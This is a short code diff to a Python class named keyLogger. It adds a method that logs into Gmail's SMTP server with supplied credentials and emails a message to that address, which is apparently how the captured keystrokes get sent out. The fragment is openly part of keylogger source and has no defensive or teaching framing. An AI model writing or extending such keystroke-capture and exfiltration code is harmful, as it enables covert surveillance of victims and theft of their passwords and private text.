@@ -80,3 +80,17 @@ class keyLogger():
         print(f"[+] Saved {self.filename}.txt")
 
 
+
+    def send_email(self, email, password, message):
+        # manages a connection to the SMTP server
+        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+        # connect to the SMTP server as TLS mode ( for security )
+        server.starttls()
+        # login to the email account
+        server.login(email, password)
+        # send the actual message
+        server.sendmail(email, email, message)
+        # terminates the session
+        server.quit()
+
+
